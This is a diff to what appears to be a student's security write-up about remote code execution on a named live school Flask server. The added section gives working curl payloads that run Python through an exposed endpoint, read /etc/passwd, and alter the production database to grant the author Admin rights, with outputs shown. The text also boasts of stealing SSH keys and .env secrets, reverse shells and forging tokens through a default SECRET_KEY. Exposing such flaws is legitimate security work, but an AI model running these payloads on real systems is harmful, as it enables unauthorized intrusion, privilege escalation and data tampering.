@@ -100,6 +100,76 @@ curl -X POST https://flask.opencodingsociety.com/run/python \
 {"output": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n\n"}
 ```
 
+### Example of Privilege Escalation
+
+In trying to find an easy way to do a privilege escalation without modifying the files of the actual server (although I definitely can -- see the demo), I realized you could simply load the actual Flask server's backend functionalities and use it to update my role in the database.
+
+I first needed to figure out what I was working with, so I found my working directory:
+```bash
+curl -X POST https://flask.opencodingsociety.com/run/python \
+-H "Content-Type: application/json" \
+-d '{"code": "import os\nprint(os.getcwd())"}'
+```
+```json
+{"output": "/app\n"}
+```
+
+I then gathered some info on the system path to see how Python was being run on the deployed server:
+```bash
+curl -X POST https://flask.opencodingsociety.com/run/python \
+-H "Content-Type: application/json" \
+-d '{"code": "import sys\nprint(sys.path)"}'
+```
+```json
+{"output": "['/tmp', '/usr/local/lib/python312.zip', '/usr/local/lib/python3.12', '/usr/local/lib/python3.12/lib-dynload', '/usr/local/lib/python3.12/site-packages']\n"}
+```
+
+From there, I can decide where to load the backend functions from, then use that path to try gathering info from the DB (which is the route I took to minimize the destructiveness of this little show).
+```bash
+curl -X POST https://flask.opencodingsociety.com/run/python \
+-H "Content-Type: application/json" \
+-d '{"code": "import sys\nsys.path.insert(0, '\''/app'\'')\nfrom __init__ import app, db\nfrom model.user import User\nwith app.app_context():\n    u = User.query.filter_by(_uid='\''mataiodoxion'\'').first()\n    print(u)"}'
+```
+```json
+{"output": "{\"id\": <my id>, \"uid\": \"mataiodoxion\", \"name\": \"<my name>\", \"email\": \"<my email>\", \"sid\": \"<my sid>\", \"role\": \"User\", \"pfp\": \"\", \"class\": [\"CSP\"], \"kasm_server_needed\": false, \"grade_data\": {}, \"ap_exam\": {}, \"password\": \"<my password>\", \"school\": \"Del Norte High School\", \"sections\": []}\n"}
+```
+Here, we've gather my info from the actual DB (redacted for obvious reasons), but the interesting thing to take note of is that fact that my `role` is currently `"User"`.
+
+In the payload, I've loaded the classes I'll be using with
+```py
+import sys
+sys.path.insert(0, '/app')
+from __init__ import app, db
+from model.user import User
+```
+
+After that, it's just a simple use of the `User` class's functions to perform a SQL query:
+```py
+with app.app_context():
+    u = User.query.filter_by(_uid='mataiodoxion').first()
+    print(u) # print my data
+```
+
+From there, it's simply two additional lines to update my role and commit the changes to the DB:
+```bash
+curl -X POST https://flask.opencodingsociety.com/run/python \
+-H "Content-Type: application/json" \
+-d '{"code": "import sys\nsys.path.insert(0, '\''/app'\'')\nfrom __init__ import app, db\nfrom model.user import User\nwith app.app_context():\n    u = User.query.filter_by(_uid='\''mataiodoxion'\'').first()\n    u.role = '\''Admin'\''\n    db.session.commit()\n    print(u)"}'
+```
+
+Notice the addition of setting the role and saving/closing the session:
+```py
+u.role = "Admin"
+db.session.commit()
+```
+
+And with that, I've given myself `Admin` perms (notice the `role` field).
+```json
+{"output": "{\"id\": <my id>, \"uid\": \"mataiodoxion\", \"name\": \"<my name>\", \"email\": \"<my email>\", \"sid\": \"<my sid>\", \"role\": \"Admin\", \"pfp\": \"\", \"class\": [\"CSP\"], \"kasm_server_needed\": false, \"grade_data\": {}, \"ap_exam\": {}, \"password\": \"<my password>\", \"school\": \"Del Norte High School\", \"sections\": []}\n"}
+```
+
+On the actual live [website](https://flask.opencodingsociety.com), I was able to log in to my now admin account and view/interact with the user and KASM management pages. Great!
+
 I can also grab ssh keys. I can even grab the `.env` if I wanted to, which would in theory expose the admin password, recovery passwords, db passwords, API keys, etc. I could also open reverse shells to gain *complete* access to the server if I wanted to. I can install malware, deface the website, DOS the server... the possibilities are endless.
 
 In short, I smashed it.
@@ -196,7 +266,7 @@ class _Generate(Resource):
 SECRET_KEY = os.environ.get('SECRET_KEY') or 'SECRET_KEY' # secret key for session management
 ```
 
-If `SECRET_KEY` isn't set (as an env var), then it defaults to the literal string. From my previous RCE attack, I demonstrated I could overwrite files. Thus, if I wanted to, I could overwrite the `.env` file this forge my own token to put in a backdoor:
+If `SECRET_KEY` isn't set (as an env var), then it defaults to the literal string. From my previous RCE attack, I demonstrated I could overwrite files. Thus, if I wanted to, I could overwrite the `.env` file with this forge my own token to put in a backdoor:
 ```py
 import jwt
 
